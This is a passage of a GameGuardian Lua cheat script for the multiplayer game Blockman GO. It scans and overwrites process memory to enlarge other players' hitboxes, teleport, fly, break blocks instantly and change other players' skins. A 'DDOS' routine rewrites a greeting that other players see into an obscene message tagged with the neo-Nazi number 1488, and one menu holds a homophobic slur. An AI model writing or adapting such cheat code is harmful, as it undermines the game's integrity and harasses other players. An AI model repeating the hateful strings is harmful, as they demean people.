d=d+2 for b=1,#g16 do table.insert(spisok228, {['address'] = g16[b].address+d, ['flags'] = 2})if d==2 then table.insert(spisok228, {['address'] = g16[b].address+0x2c, ['flags'] = 4})end end end gg.loadResults(spisok228)h=gg.getResults(99999)gg.clearResults()spisok228=nil
for i=1,#h do
if h[i].value == string.byte('-') and h[i+1].value == string.byte('C') and h[i+2].value == string.byte('o') and h[i+3].value == string.byte('n') and h[i+4].value == string.byte('t') and h[i+5].value == string.byte('e') and h[i+6].value == string.byte('n') and h[i+7].value == string.byte('t') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI.showCon={address=h[i+16].address,flags=4,freeze=true,value=257}
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('r') and h[i+3].value == string.byte('e') and h[i+4].value == string.byte('e') and h[i+5].value == string.byte('t') and h[i+6].value == string.byte('i') and h[i+7].value == string.byte('n') and h[i+8].value == string.byte('g') and h[i+9].value == string.byte('s')  and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
if h[i+10].value == 0 then
MainUI.btnDDOSMain={address=h[i+16].address,flags=4,freeze=true,value=257}
elseif h[i+11].value == string.byte('N') then
MainUI.btnDDOSName={address=h[i+16].address,flags=4,freeze=true,value=257}
end
end
elseif h[i].value == 0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI.DDOSMain={address=h[i+16].address,flags=4,freeze=true,value=257}
end
end
end gg.searchNumber(':PlayerOperation.json',1)gg.refineNumber(':P',1)if gg.getResultsCount()==1 then Main10.DDOSId={address=gg.getResults(1)[1].address+0x7f,flags=32,freeze=true,value=-1} gg.clearResults() else t=gg.getResults(1488)gg.clearResults()for i=1,#t do t[i].address=t[i].address+0x7f t[i].flags=32 end gg.loadResults(t)gg.refineNumber(-1,32)Main10.DDOSId=gg.getResults(1) end
gg.clearResults()gg.searchNumber(':Вы поприветствовали игрока',1)gg.getResults(1488)gg.editAll(':▢FFFF0000DDOS PENIS BY WIZARD1488',1)gg.clearResults()
DDOSEnable=true
end


function FlyParaplane()
clientChecker()
for i, v in pairs(t) do
        v.flags = 16
        v.address = v.address + -200
		v.value = "1"
		v.freeze = true
		gg.addListItems(t)
		v.address = v.address + 0x544
		v.value = "0.50001525879"
		v.freeze = true
		gg.addListItems(t)
		v.address = v.address + 0x194
		v.value = "2.3693558e-38"
		v.freeze = true
		gg.addListItems(t)
		v.address = v.address + 8
		v.value = "-1"
		v.freeze = true
		gg.addListItems(t)
end
gg.clearResults()
gg.clearList()
end


function TpY()
gg.clearResults()
gg.clearList()
if not eng1 then
input88 = gg.prompt({"🔹Телепорт по Y『☄️』\n\nВведи значение:",'Не изменить, а прибавить『☄️+』'
        },{'',false},{'number','checkbox'})
        else
        input88 = gg.prompt({
            "🔹Teleport the Y『☄️』\n\nEnter value:"
        }, {
            [1] = ""
        })
        end
        if input88 then
        on2327 = input88[1]:gsub(",", ".")
checkNumber(on2327)
if error1488 then
TpY()
do return end
end
        off2279=on2327 + 0.000998
clientChecker()
for i,v in pairs(t) do
v.flags = 16
v.address = v.address + -164
if not input88[2] then
v.value = off2279
else
h = gg.getValues(t)
v.value = h[1].value + off2279
end
v.freeze = true
gg.addListItems(t)
j = gg.getValues(t)
v.address = v.address + 0xC
v.value = '-9999999999'
v.freeze = true
gg.addListItems(t)
end
gg.clearResults()
gg.clearList()
t = tonumber(j[1].value)
t = math.floor(t)
end
end

function pTextColor(r,g,b)
tsp.para1,tsp.para2,tsp.para3={address=UI7[1].address+0x154,flags=16,freeze=true,value=r},{address=UI7[1].address+0x158,flags=16,freeze=true,value=g},{address=UI7[1].address+0x15C,flags=16,freeze=true,value=b}
end
function pIconColor(r,g,b)
tsp.par1,tsp.par2,tsp.par3={address=UI7[1].address+0x144,flags=16,freeze=true,value=r},{address=UI7[1].address+0x148,flags=16,freeze=true,value=g},{address=UI7[1].address+0x14C,flags=16,freeze=true,value=b}
end

function MovY()
gg.clearResults()
gg.clearList()
if not eng1 then
input89 = gg.prompt({
            "🔹Перемещение по Y『☄️』\n\nВведи значение:"
        }, {
            [1] = ""
        })
        else
        input89 = gg.prompt({
            "🔹Moving the Y『☄️』\n\nEnter value:"
        }, {
            [1] = ""
        })
        end
        if input89 then
        on2328 = input89[1]:gsub(",", ".")
        if on2328 == "" then
        if not eng1 then
        gg.toast('Строка не может быть пуста❗')
        else
        gg.toast('String cannot empty❗')
        end
        else
         checknum5 = tonumber(on2328)
        if checknum5 == nil then
        if not eng1 then
  gg.toast('Обнаружены стороние символы. ВВОДИ ТОЛЬКО ЧИСЛА❗❗❗')
  else
  gg.toast('incompatible symbols detected. ENTER NUMBERS ONLY❗❗❗')
  end
else
        off3279=on2328 + 0.000998
clientChecker()
for i, v in pairs(t) do
    v.flags = 16
	v.address = v.address + 0xffffffffffffff38
	v.value = off3279
	v.freeze = true
	gg.addListItems(t)
end
gg.clearResults()
gg.clearList()
end
end
end
end

function attention2()
gg.alert("Скачай GUI На канале ютуб Lereful-Play, там будет туториал как это установить.", "Хорошо")
attention = 1
end

function attentionRE()
if gg.alert("Внимание❗ Для использования функции возрождения необходимо иметь установленный GUI (Подробнее на канале Lereful-Play), в противном случае игра вылетит (Исключение: build and shoot, battle royale)", "Понял") then
menuAttention = gg.choice({'🔹Возродиться『🌟』','🔹Нету GUI❗'},'777', '𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖:@𝙼𝚊𝚐𝚒𝚌𝙽𝚘𝚘𝚋')
if menuAttention == 1 then RespawnGUIOn() end
if menuAttention == 2 then attention2() end
end
end

function NotAttentionRE()
if attention == 0 then
RespawnGUIOn()
end
end

function RespawnGUIOn()
antyL1=1
gg.setVisible(false)
gg.clearList()
gg.clearResults()
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber("54", 4)
t = gg.getResults(99999)
gg.addListItems(t)
t = gg.getListItems()
for i, v in pairs(t) do
    v.address = v.address + -4
end
gg.addListItems(t)
t = gg.getListItems()
for i, v in pairs(t) do
        v.flags = 1		
end
gg.addListItems(t)
gg.loadResults(t)
gg.getResults(99999)
gg.refineNumber("1", 1)
gg.clearList()
t = gg.getResults(99999)
gg.addListItems(t)
t = gg.getListItems()
gg.removeListItems(t)
for i, v in pairs(t) do
    v.address = v.address + -8
end
gg.addListItems(t)
t = gg.getListItems()
for i, v in pairs(t) do
        v.flags = 8
end
gg.addListItems(t)
gg.loadResults(t)
gg.getResults(99999)
gg.refineNumber("1~1000000", 8)
gg.clearList()
t = gg.getResults(99999)
gg.addListItems(t)
t = gg.getListItems()
gg.removeListItems(t)
for i, v in pairs(t) do
    v.address = v.address + 0x10
end
gg.addListItems(t)
t = gg.getListItems()
for i, v in pairs(t) do
        v.flags = 1
end
gg.addListItems(t)
gg.loadResults(t)
gg.getResults(99999)
gg.refineNumber("0", 1)
gg.getResults(99999)
gg.editAll("1", 1)
gg.clearList()
gg.clearResults()
attention = 0
GGCheck1=-1
AntyL1 = 0
end
function CUanim()
t=gg.prompt({'#1','#2','time(ms)'},{15,2000,333},{'number','number','number'})
if t and tonumber(t[1],10) and tonumber(t[2],10) and tonumber(t[3],10) then
custom1,HideAttack,animxd=0,true,true
cnum1,cnum2,custom2=t[1],t[2],t[3]
end
end


function RespawnGUI()
gg.clearResults()
gg.clearList()
if attention == 0 then
RespawnGUIOn()
else
attentionRE()
end
end
function Actions()
gg.clearResults()
if not eng1 then
menuMaint = gg.multiChoice({
    [1] = _,
    [2] = '🔸Замораживать эмодзи『❄️』',
    [3] = '🔹Обычные эмоции(Visual)『🆔』',
    [4] ='🔹Кастомная эмоция (No visual)',
    [5] =_,
	[6] =_,
	[7] =_,
	[8] =_,
	[9] =_,
	[10] = '🔹Лежать『ID:15』',
	[11] = '🔹Сидеть v1『ID:12』',
	[12] = '🔹Сидеть v2『ID:13』',
	[13] = '🔹Начало прыжка『ID:2』',
	[14] = '🔹Конец прыжка『ID:3』',
	[15] = '🔹Поплавок『ID:8』',
	[16] = '🔹Плавать『ID:7』',
	[17] = '🔹Показать розу 『ID:1013』',
	[18] = '🔹Помахать рукой 『ID:1011』',
	[19] = '🔹Взбираться v1『ID:9』',
	[20] = '🔹Взбираться v2『ID:10』',
	[21] = '🔹Взбираться v3 『ID:11』',
	[22] = '🔹Парашют 『ID:14』',
	[23] = '🔹Перезарядка оружия 『ID:1009』',
	[24] = '🔹Блокироваться 『ID:1008』',
	[25] = '🔹Атака фараона 『ID:2000』',
	[26] = '🔹Выстрел с лука 『ID:1002』',
	[27] =_,
	[28] = '🔹Выстрел с оружия『ID:1010』',
	[29] = '🔹Кушать/пить『ID:1005』',
	[30] = '🔹sexmode',
	[31] ='🔹Наркоман'}, {[2] = animFreezeDa,[4]=animxd,[30]=sexmod,[31]=narkoman}, '🔹Выбрать действие(Все игроки видят их)')
	else
	menuMaint = gg.multiChoice({
    [1] = _,
    [2] = '🔸Freeze Actions『❄️』',
    [3] = '🔹Emoji by ID『🆔』',
    [4] =_,
    [5] =_,
	[6] =_,
	[7] =_,
	[8] =_,
	[9] =_,
	[10] = '🔹Sleep『ID:15』',
	[11] = '🔹Sit v1『ID:12』',
	[12] = '🔹Sit v2『ID:13』',
	[13] = '🔹End Of Jump『ID:2』',
	[14] = '🔹Begin Of Jump『ID:3』',
	[15] = '🔹Float『ID:8』',
	[16] = '🔹Swim『ID:7』',
	[17] = '🔹Show Rose 『ID:1013』',
	[18] = '🔹Wave ur hand 『ID:1011』',
	[19] = '🔹Climb v1『ID:9』',
	[20] = '🔹Climb v2『ID:10』',
	[21] = '🔹Climb v3 『ID:11』',
	[22] = '🔹Parachute 『ID:14』',
	[23] = '🔹Reload Gun 『ID:1009』',
	[24] = '🔹Block 『ID:1008』',
	[25] = '🔹Attack Of Pharaoh 『ID:2000』',
	[26] = '🔹Shot Of Bow 『ID:1002』',
	[27] =_,
	[28] = '🔹Shot Of Gum『ID:1010』',
	[29] = '🔹Eat/Drink『ID:1005』',
	[30] = '🔹Sex Mode',
	[31] ='🔹Crazy Faggot'}, {[2] = animFreezeDa,[30]=sexmod,[31]=narkoman}, '🔹Select Action(All Players Can See It)')
	end
if menuMaint then
if menuMaint[31] and not narkoman then
narkoman=true
elseif not menuMaint[31] and narkoman then
narkoman=false
end
gg.setVisible(false) 
ActionsAct()
else
gg.setVisible(false)
end
end

function Emoji()
InputEmoji = gg.prompt({
            "🔹Emoji\n\nID:"
        }, {
            [1] = ""
        })
if InputEmoji then
checknumV1 = tonumber(InputEmoji[1])
   if InputEmoji[1] == "" then
        gg.toast('Строка не может быть пуста❗')
        elseif checknumV1 == nil then
  gg.toast('Обнаружены стороние символы. ВВОДИ ТОЛЬКО ЧИСЛА❗❗❗')
else
local g = WizardUtf8.len(InputEmoji[1])
if g == 1 then
a,b,c= '&','',InputEmoji[1]
elseif g == 2 then
a,b,c= '(',string.sub(InputEmoji[1], 2, 2),string.sub(InputEmoji[1], 1, 1)
elseif g == 3 then
a,b,c= '*',string.sub(InputEmoji[1], 2, 3),string.sub(InputEmoji[1], 1, 1)
end
Main10['Anim'].value=2001
gg.addListItems({{address=Mag3[1].address+0x748,flags=4,freeze=true,value=":"..a.."selecta"},{address=Mag3[1].address+0x74C,flags=4,freeze=true,value=":ectable_"},{address=Mag3[1].address+0x750,flags=4,freeze=true,value=":ble_acti"},{address=Mag3[1].address+0x754,flags=4,freeze=true,value=":action_"..c},{address=Mag3[1].address+0x758,flags=4,freeze=true,value=":on_"..InputEmoji[1]},{address=Mag3[1].address+0x75C,flags=4,freeze=true,value=":"..b},Main10['Anim']})gg.clearList()gg.sleep(50)actionOn(1012)
end
end
end

function Act2(num)
MainXa(16,-224,num)
end





function actionOn(num,st)
if not animFreezeDa and Open['Ground'].value~=257 and not st then
WizardMain(UI1,'Надо быть на земле!',1500,1,{1,1,0},true)
else
if Open.View.value==0 and not st then
Main10['View'].value=1 else Main10['View'].value=Open.View.value
end
Main10['Anim'].value=num
tsp.anim1,tsp.anim2,tsp.view3=Main10['Anim'],{address=Main10['Anim'].address+4,flags=4,freeze=true,value=-1},Main10['View']
num1337 = num
end
end

function ActionsAct()
if menuMaint[3] then
Emoji()
end
if menuMaint[2] and not animFreezeDa then
animFreezeDa = true
HideAttack=true
Act2('25')
elseif not menuMaint[2] and animFreezeDa then
Act2('0.0004')
animFreezeDa = false
HideAttack=false
end
if menuMaint[4] and not animxd then
CUanim()
elseif not menuMaint[4] and animxd then
custom1,HideAttack,animxd=nil,nil,nil
end
if menuMaint[5] then
MainUI['MoveState'].value,MainUI['Shift'].value,MainUI['RunState'].value,MainUI['Sprint'].value=0,1,257,1 gg.addListItems({MainUI['MoveState'],MainUI['Sprint'],MainUI['RunState'],MainUI['Shift']})gg.clearList()
end
if menuMaint[6] then
MainUI['MoveState'].value,MainUI['Shift'].value,MainUI['RunState'].value,MainUI['Sprint'].value=2,1,1,257 gg.addListItems({MainUI['MoveState'],MainUI['Sprint'],MainUI['RunState'],MainUI['Shift']})gg.clearList()
end
if menuMaint[7] then
Act2('-1')
end
if menuMaint[8] then
Act2('25')
end
if menuMaint[9] and not animxd2 then

end
if menuMaint[10] then
actionOn(15)
end
if menuMaint[11] then
actionOn(12)
end
if menuMaint[12] then
actionOn(13)
end
if menuMaint[13] then
actionOn(2)
end
if menuMaint[14] then
actionOn(3)
end
if menuMaint[15] then
actionOn(8)
end
if menuMaint[16] then
actionOn(7)
end
if menuMaint[17] then
actionOn(1013)
end
if menuMaint[18] then
actionOn(1011)
end
if menuMaint[19] then
actionOn(9)
end
if menuMaint[20] then
actionOn(10)
end
if menuMaint[21] then
actionOn(11)
end
if menuMaint[22] then
actionOn(14)
end
if menuMaint[23] then
actionOn(1009)
end
if menuMaint[24] then
actionOn(1008)
end
if menuMaint[25] then
actionOn(2000)
end
if menuMaint[26] then
actionOn(1002)
end
if menuMaint[27] and not animxd1 then

end
if menuMaint[28] then
actionOn(1010)
end
if menuMaint[29] then
actionOn(1005)
end

if menuMaint[30] and not sexmod then
sexmod=true
sexmodtime=currenttime
elseif not menuMaint[30] and sexmod then
sexmod=false
end
if menuMaint[31] and not sexmod2 then
sexmod2=true
elseif not menuMaint[31] and sexmod2 then
sexmod2=false
end
end
--Пока что нихуя



function getAllPlayers(All)
gg.clearResults()
gg.clearList()
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber(180,16)
t=gg.getResults(99999)
gg.clearResults()
for i=1,#t do
t[i].flags = 4
t[i].address = t[i].address + 0x50
end
gg.loadResults(t)
gg.refineNumber(60,4)
gg.clearList()
t=gg.getResults(99999)
gg.clearResults()
for i=1,#t do
t[i].flags = 16
t[i].address = t[i].address -0x244
end
gg.loadResults(t)
gg.refineNumber(0,16)
t=gg.getResults(99999)
gg.clearResults()
for i=1,#t do
t[i].flags = 64
t[i].address = t[i].address + 0x138
end
gg.loadResults(t)
gg.refineNumber("0.123~1000", 64)
t=gg.getResults(99999)
gg.clearResults()
if not NoTeam and not All then
for i=1,#t do
t[i].flags = 4
t[i].address = t[i].address + 0x248
end
gg.loadResults(t)gg.refineNumber(Open.TeamId.value,4,_, gg.SIGN_NOT_EQUAL)t=gg.getResults(99999)gg.addListItems(t)gg.clearResults()
for i=1,#t do
t[i].flags = 16
t[i].address = t[i].address-0x380
end
else
for i=1,#t do
t[i].flags = 16
t[i].address = t[i].address-0x138
end
end
return t
end

function hitBoxOn(st)
AllPlHB=getAllPlayers()
if #AllPlHB~=0 then
hitboxA = 0.6 * auq
hitboxB = 1.8 * auq
val=1
if not st then
if input220[2] then
val=auq
end
end
for i=1,#AllPlHB do
tsp['plA'..i]={address=AllPlHB[i].address-0x34,flags=16,freeze=true,value=hitboxA}
tsp['plA2'..i]={address=AllPlHB[i].address-0xD0,flags=16,freeze=true,value=hitboxA}
tsp['plA3'..i]={address=AllPlHB[i].address-0x74,flags=16,freeze=true,value=hitboxB}
tsp['plA4'..i]={address=AllPlHB[i].address-4,flags=16,freeze=true,value=val}
end
end
end

function HitBox()
gg.setVisible(false)
gg.clearList()
gg.clearResults()
input220 = gg.prompt({
            [1] = "🔹Хит бокс『💢』\n\nВведи значение:",
            [2] = "🔹Увеличить игроков『👤⬆️』"},nil,{'number','checkbox'})
if input220 then
auq = input220[1]:gsub(',','.')
auq = tonumber(auq)
if input220[1] == '' then
gg.alert('❗Строка не может быть пуста','')
HitBox()
elseif not auq then
gg.alert('❗Обнаружены сторонние символы, вводи только числа','')
HitBox()
else
hitBoxOn()
end
end
end



function hitboxv2()input=gg.prompt({'🔹Хит бокс (вечный)『💢』\n\nВведи значение:'},{1},{'number'})if input and tonumber(input[1]) then gg.clearResults()gg.clearList()if not gethb then gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.searchNumber(4575657222512050176,32)t=gg.getResults(99999)for v=1,#t do t[v].flags=1 t[v].address=t[v].address+0xE6 end gg.loadResults(t)gg.refineNumber('105~111',1)gethb=gg.getResults(99999)gg.clearResults() end for v=1,#gethb do tsp['hb1'..v]={address=gethb[v].address-202,flags=16,freeze=true,value=input[1]}tsp['hb2'..v]={address=gethb[v].address-206,flags=16,freeze=true,value=input[1]}tsp['hb3'..v]={address=gethb[v].address-210,flags=16,freeze=true,value=input[1]}end auq=input[1]hitBoxOn(true) end end




function JetPack()

Wizard089()
gg.addListItems({{address=wizard088+4,flags=1,freeze=true,value=1},{address=Mag6[1].address+0x27c,flags=1,freeze=true,value=0}})gg.clearList()
end





MenuStatus7 = '🔴'
MenuStatus8 = '🔴'
MenuStatus9 = '🔴'
MenuStatus10 = '🔴'
MenuStatus11 = '🔴'
MenuStatus12 = '🔴'
MenuStatus13 = '🔴'
MenuStatus14 = '🔴'
MenuStatus15 = '🔴'
MenuStatus16 = '🔴'
GUINum = '🔴'
GUINum1 = 0


function getBlocks()
if not blockres then
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.setVisible(false)
gg.clearResults()gg.clearList()
gg.searchNumber(':Blocks.json',1)
gg.refineNumber(':B')
res=gg.getResults(1488)
gg.clearResults()
if not EffectBlock then
gg.setRanges(16384 | 8)
gg.searchNumber(':lockDestroyEffectSize',1)
gg.refineNumber(':l')
EffectBlock=gg.getResults(1)
gg.clearResults()
end
if not effectoff then
effectoff=gg.getValues({{address=EffectBlock[1].address-1,flags=1}})[1].value
while true do
val=math.random(1,100)
if val~=effectoff then
break
end
end
end
t={}
for i=1,#res do
t[i]={address=res[i].address+-97-0x20,flags=4}
t[#res+i]={address=res[i].address+-105-0x20,flags=4}
t[#res*2+i]={address=res[i].address+-113-0x20,flags=4}
t[#res*3+i]={address=res[i].address+-121-0x20,flags=4}
end
gg.loadResults(t)
gg.refineNumber('1~10000',4) --Block ids
t=gg.getResults(1337)
gg.clearResults()
for i=1,#t do
t[i].flags=16
t[i].address=t[i].address+4
t[i].value=0
t[i].freeze=true
end
blockres2=t
blockres=gg.getValues(t)
for i=1,#t do
blockres[i].freeze=true
end
t={}
for i=1,#blockres do
t[i]={address=blockres[i].address+28,flags=16,freeze=true,value=0}
t[#blockres+i]={address=blockres[i].address+32,flags=16,freeze=true,value=0}
t[#blockres*2+i]={address=blockres[i].address+36,flags=16,freeze=true,value=0}
end
noclipoff=gg.getValues(t)
noclipon=t
for i=1,#t do
noclipoff[i].freeze=true
end

blockres['woff']={address=EffectBlock[1].address-1,flags=1,freeze=true,value=effectoff}
blockres2['won']={address=EffectBlock[1].address-1,flags=1,freeze=true,value=val}
t=nil
res=nil
end
end


function FastBreak(st)
getBlocks()
if st then
gg.addListItems(blockres2)
gg.clearList()
fastonbr=true
else
gg.addListItems(blockres)
gg.clearList()
fastonbr=false
end
end


function SkinChanger()
if not eng1 then
SkinChangerMenu = gg.choice({'Создать свой скин『My👔』','Скин создателя скрипта『Dev👔』', 'Рандомный скин『👔❓』', 'Поменять скин игрокам『👔👤』', 'Вернуть мой скин『👔✅』'},'777', '🔹Поменять скин『👔』\n🔺Пол аккаунта: ' ..gender)
else
SkinChangerMenu = gg.choice({'Make Own Skin『My👔』','Skin Of Script Creator『Dev👔』', 'Random Skin『👔❓』', 'Change Players Skin『👔👤』', 'Return My Skin『👔✅』'},'777', '🔹Skin Changer『👔』\n🔺Gender: ' ..gender)
end
if SkinChangerMenu==1 then
if eng1 then
clothes=gg.prompt({
            "🔹Wings\nID:", "🔹Glasses\nID:", "🔹Шляпа\nID:", "🔹Scraf\nID:", "🔹Хвост\nID(from 1 to 5):", "🔹Футболка\nID:", "🔹Штаны\nID:", "🔹Fair\nID:", "🔹Обувь\nID:", "🔹Face\nID:", "🔹Корона\nID:"},{Open.Wings.value,Open['Очки'].value,Open['Шляпа'].value,Open['Шарф'].value,Open['Хвост'].value,Open['Футболка'].value,Open['Штаны'].value,Open['Волосы'].value,Open['Обувь'].value,Open['Лицо'].value,Open['Корона'].value})
else
clothes=gg.prompt({
            "🔹Крылья\nID:", "🔹Очки\nID:", "🔹Шляпа\nID:", "🔹Шарф\nID:", "🔹Хвост\nID(от 1 до 5):", "🔹Футболка\nID:", "🔹Штаны\nID:", "🔹Волосы\nID:", "🔹Обувь\nID:", "🔹Лицо\nID:", "🔹Корона\nID:"},{Open.Wings.value,Open['Очки'].value,Open['Шляпа'].value,Open['Шарф'].value,Open['Хвост'].value,Open['Футболка'].value,Open['Штаны'].value,Open['Волосы'].value,Open['Обувь'].value,Open['Лицо'].value,Open['Корона'].value})end
if clothes then
for w=1,11 do
if not tonumber(clothes[w],10) then
clothes=nil
WizardMain(UI1,'Ошибка смены скина!',1500,1,{1,0,0},true)
break
end
end
end
elseif SkinChangerMenu==2 then
if Gender~=2 then
clothes={22,0,39,1,0,9,10011,10,28,1,6}
else
clothes={22,6,39,1,0,9,10011,11,9,12,6}
end
elseif SkinChangerMenu==3 then
clothes={math.random(1, 185),math.random(1, 100),math.random(1, 100),math.random(1, 55),math.random(1, 5),math.random(1, 100),math.random(1, 100),math.random(1, 100),math.random(1, 100),math.random(1, 100),math.random(1, 100)}
elseif SkinChangerMenu==4 then
elseif SkinChangerMenu==5 then
clothes=MySkin
end
if clothes and SkinChangerMenu then
local t=Mag6[1].address
tsp.cl1,tsp.cl2,tsp.cl3,tsp.cl4,tsp.cl5,tsp.cl6,tsp.cl7,tsp.cl8,tsp.cl9,tsp.cl10,tsp.cl11,tsp.cl12={address=t+0x604,flags=4,freeze=true,value=clothes[1]},{address=t+0x5fc,flags=4,freeze=true,value=clothes[2]},{address=t+0x608,flags=4,freeze=true,value=clothes[3]},{address=t+0x600,flags=4,freeze=true,value=clothes[4]},{address=t+0x614,flags=4,freeze=true,value=clothes[5]},{address=t+0x5f0,flags=4,freeze=true,value=clothes[6]},{address=t+0x5f4,flags=4,freeze=true,value=clothes[7]},{address=t+0x5ec,flags=4,freeze=true,value=clothes[8]},{address=t+0x5f8,flags=4,freeze=true,value=clothes[9]},{address=t+0x5e8,flags=4,freeze=true,value=clothes[10]},{address=t+0x648,flags=4,freeze=true,value=clothes[11]},{address=t+0x578,flags=1,freeze=true,value=1}
if SkinChangerMenu==5 then
clothes=nil
end
end
end

function SetBlock()
if not eng1 then
inputT1 = gg.prompt({
            "🔹Строить много блоков『🟧』\n\nВведи значение:"
        }, {
            [1] = "1"
        })
        else
        inputT1 = gg.prompt({
            "🔹Set Block『🟧』\n\nEnter value:"
        }, {
            [1] = "1"
        })
        end
        if inputT1 then
        on2323T1 = inputT1[1]:gsub(",", ".")
        if on2323T1 == "" then
        if not eng1 then
        gg.toast('Строка не может быть пуста❗')
        else
        gg.toast('String cannot empty❗')
        end
        else
         checknumT1 = tonumber(on2323T1)
        if checknumT1 == nil then
        if not eng1 then
  gg.toast('Обнаружены стороние символы. ВВОДИ ТОЛЬКО ЧИСЛА❗❗❗')
  else
  gg.toast('incompatible symbols detected. ENTER NUMBERS ONLY❗❗❗')
  end
else
if not wizard085 then
wizard085=getPKey('QuicklyBuildBlockNum',nil)
end
 tsp.build={address=wizard085+4,flags=4,freeze=true,value=checknumT1}
if on2323T1 == "1" or on2323T1 == "1.0" then
MenuStatus6 = '🔴'
else
MenuStatus6 = '🟢x' .. on2323T1
end
end
end
end
end

function WWECam(st)
if st then t=1 else t=0 end
if not wizard087 then
wizard087=getPKey('IsSeparateCamera')
end
tsp.wwecam={address=wizard087+4,flags=1,freeze=true,value=t}
end

function NoDelay(on27,st)
if not NoDelayVal then
gg.clearResults()
gg.clearList()
gg.setRanges(16384 | 8)
gg.searchNumber(":lickSceneCD",1)
gg.refineNumber(":l",1)
NoDelayVal = gg.getResults(1)
end
if not delay then
delay=gg.getValues({{address=NoDelayVal[1].address-1,flags=1}})[1].value
end
if on27 then
while true do
if not st then
NoDelayStatus=true
end
val=math.random(1,100)
if val~=delay then
break end
end
else
val=delay
if not st then
NoDelayStatus=nil
end
end
if not st then
gg.addListItems({{address=NoDelayVal[1].address-1,flags=1,freeze=true,value=val}})
gg.clearResults()
gg.clearList()
else
tsp.delay123={address=NoDelayVal[1].address-1,flags=1,freeze=true,value=val}
end
end

function RightRotation()
gg.clearResults()
gg.clearList()
if not eng1 then
input888 = gg.prompt({
            "🔹Вращение вправо 『⚡➡️』\n\nВведи скорость вращения:"
        }, {
            [1] = "0"
        })
        else
        input888 = gg.prompt({
            "🔹Rotation right『⚡➡️』\n\nEnter rotation speed:"
        }, {
            [1] = "0"
        })
        end
        if input888 then
        on23278 = input888[1]:gsub(",", ".")
        if on23278 == "" then
        if not eng1 then
        gg.toast('Строка не может быть пуста❗')
        else
        gg.toast('String cannot empty❗')
        end
        else
         checknum48 = tonumber(on23278)
        if checknum48 == nil then
        if not eng1 then
  gg.toast('Обнаружены стороние символы. ВВОДИ ТОЛЬКО ЧИСЛА❗❗❗')
  else
  gg.toast('incompatible symbols detected. ENTER NUMBERS ONLY❗❗❗')
  end
else
Podryb=on23278 - 0.0128
clientChecker()
for i, v in pairs(t) do
        v.flags = 16
        v.address = v.address + 0x8
		v.value = Podryb
		v.freeze = true
end
gg.addListItems(t)
gg.clearResults()
gg.clearList()
end
end
end
end


function ScriptInfo()
StartUp = false
if not eng1 then
InfoScript = gg.alert("🔺Создатель скрипта: Wizard『👑』\n🔸Некоторые функции от: Yotsu23『👍』\n🔹Зашифровал и защитил скрипт: Madara_DaOne『🛡️』\n\n🔺Wizard『👑』\n🔹Telegram канал: @MagicFromWizard\n🔹Telegram (лс): @ImFakeWizard, @MagicNoob\n🔹Язык: Русский🇷🇺\n🔻Айди в Blockman GO: 64928\n\n🔺Yotsu23『👍』\n🔹Telegram (лс): @Linnaquna\n🔹Discord (лс): @linhquna\n🔹YouTube: Yotsu (@Yotsu23)\n🔹Язык: Вьетнамский🇻🇳\n🔻Айди в Blockman GO: 15008863\n\n🔺Madara_DaOne『🛡️』\n🔹Telegram (лс): @MadaraDaOne\n🔹YouTube: Madara (@madarabmgo3738)\n🔹Язык: Русский🇷🇺\n🔻Айди в Blockman GO: 2895032352",'')
else
InfoScript = gg.alert("🔺Script creator: Wizard『👑』\n🔸Some functions by: Yotsu23『👍』\n🔹Encrypted and protected the script by: Madara_DaOne『🛡️』\n\n🔺Wizard『👑』\n🔹Telegram channel: @MagicFromWizard\n🔹Telegram (private message): @ImFakeWizard, @MagicNoob\n🔹Language: Russian🇷🇺\n🔻ID In Blockman GO: 64928\n\n🔺Yotsu23『👍』\n🔹Telegram (private message): @Linnaquna\n🔹Discord (private message): @linhquna\n🔹YouTube: Yotsu (@Yotsu23)\n🔹Language: Vietnamese🇻🇳\n🔻ID In Blockman GO: 15008863\n\n🔺Madara_DaOne『🛡️』\n🔹Telegram (private message): @MadaraDaOne\n🔹YouTube: Madara (@madarabmgo3738)\n🔹Language: Russian🇷🇺\n🔻ID In Blockman GO: 2895032352",'')
end
if InfoScript then
--м.б нужно будет
end
end

function exit()
gg.setVisible(true)
    print("Комментарий автора:\n\nСпасибо за использование моей магии!\nЕсли остались вопросы, то можешь задать мне их в telegram.\nTelegram:@MagicNoob\n\n\n❗Скрипт был взят с ютуб канала Lereful-Play")gg.addListItems(defspisok)gg.clearList()
os.exit()
end

function exitEN()
gg.setVisible(true)
print("Author comment:\n\nThank you for using my magic!\nIf you have any questions, you can ask me on Telegram.\nTelegram:@MagicNoob\n\n\n❗The script was taken from the Lereful-Play YouTube channel")
os.exit()
end

function TNTTAGPotions()
gg.setVisible(false)
gg.clearList()
gg.clearResults()
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber('735~748',4)
t = gg.getResults(99999)
gg.clearResults()
for i=1,#t do
t[i].flags = 4
t[i].address = t[i].address-36
end
gg.loadResults(t)
gg.refineNumber('1~64',4)
t = gg.getResults(99999)
gg.clearResults()
for i=1,#t do
t[i].flags = 1
t[i].address = t[i].address + 80
end
gg.loadResults(t)
gg.refineNumber('1',1)
t = gg.getResults(99999)
gg.clearResults()
for i=1,#t do
t[i].flags = 4
t[i].address = t[i].address-44
t[i].value = '530'
t[i].freeze = true
tsp['Potion'..i]=t[i]
end
end
function BackMainMenu()
MainMenu = true
ActionsMenu = false
aga1 = true
end


function changeLanguage()
if eng1 then
eng1 = nil
else
eng1 = true
end
end
StartUp = nil
function MagicMenuMain()
if not eng1 then
gg.setVisible(false)
menuMain = gg.choice({'Фунᴋции『📋』', 'О ᴄᴋᴩиᴨᴛᴇ『📄』','Настройки скрипта','𝙀𝙣𝙜𝙡𝙞𝙨𝙝 𝙑𝙚𝙧𝙨𝙞𝙤𝙣『🇺🇸』','Выйᴛи『⬅️』'},nil, '🔹Мᴇню ʙыбоᴩᴀ 𝙫1.3')
else
gg.setVisible(false)
